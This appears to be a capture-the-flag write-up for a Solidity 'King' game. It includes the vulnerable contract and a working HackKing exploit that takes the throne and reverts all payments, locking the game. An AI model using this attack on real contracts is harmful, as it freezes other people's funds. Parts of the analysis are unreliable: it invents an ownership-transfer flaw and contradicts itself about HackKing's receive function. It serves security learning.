### TASK
The task of the game is to be the player who sends the largest amount of ether to the game, thus becoming the "king." The objective of breaking the game would be to identify and exploit any vulnerabilities in the game's code that would allow a player to win the prize without actually sending the largest amount of ether. 
Such a fun game. Your goal is to break it.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

In Solidity, the receive function is a function that is automatically executed when a contract receives direct Ether payments. The receive function can be used to process incoming payments and update the state of the contract accordingly. The receive function is marked as external payable, which means it can receive direct Ether payments and access the msg.value property to determine the amount of the incoming payment.
<br/>

### CODE VUNERABILITIES
1. No mechanism to prevent ownership transfer: There is no mechanism in place to prevent the owner from transferring ownership of the contract to another address, potentially allowing an attacker to take control of the contract and modify its behavior. This is where we are going to break the game!

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
```

The function requires that the value of the incoming transaction (msg.value) should either be greater than or equal to the current prize (prize) or the sender of the transaction (msg.sender) should be the owner of the contract. This check allows the owner of the contract to always take the "kingship" of the contract, resetting all the values.
<br/>
<br/>

If the requirement is met, the function transfers the incoming payment to the current king (payable(king).transfer(msg.value)) and updates the king to the new sender (king = msg.sender) and the prize to the incoming payment value (prize = msg.value).
<br/>
<br/>
<br/>
From a security perspective, this function is a major concern as it enables the owner of the contract to reset everything without compensating the current king and leaving the funds trapped in the contract.
<br/>
If the transfer of ether to the current king fails, then the entire 'receive()' function will revert, making the contract unusable, meaning no one can become the new King. This can lead to a situation where funds are stuck in the contract and cannot be withdrawn, which is not desirable. To avoid this, it is recommended to use a mechanism that ensures that the transfer of funds to the current king is successful before updating the state of the contract. 
<br/>
This can be achieved using a pattern called "Safe Transfer" or by checking the return value of the transfer function and only updating the state of the contract if the transfer was successful.


### Breaking the game
We need to create and deploy a contract that will not accept any kind of Ether payment sent to it. 

```solidity
contract HackKing{
    constructor(address _instanceAddress) payable{
        (bool success, ) = payable(address(_instanceAddress)).call{value: msg.value}("");
        require(success, "Call failed");
    }

    receive() external payable {
        revert ("You can't be king!");
    }
}
```
The main purpose of the 'HackKing' contract is to take over the position of the King and stop accepting any Ether. By not including any payable functions, fallback or 'receive', no one is able to send Ether to the contract. 
<br/>
<br/>
The constructor of the contract takes an address of the king contract address and executes a call to that address with the incoming value from the payment. The 'receive' function is included in the contract, but it simply reverts any incoming payments with the message "You can't be king!".

<br/>
<b>Challenge Solved!!!</b>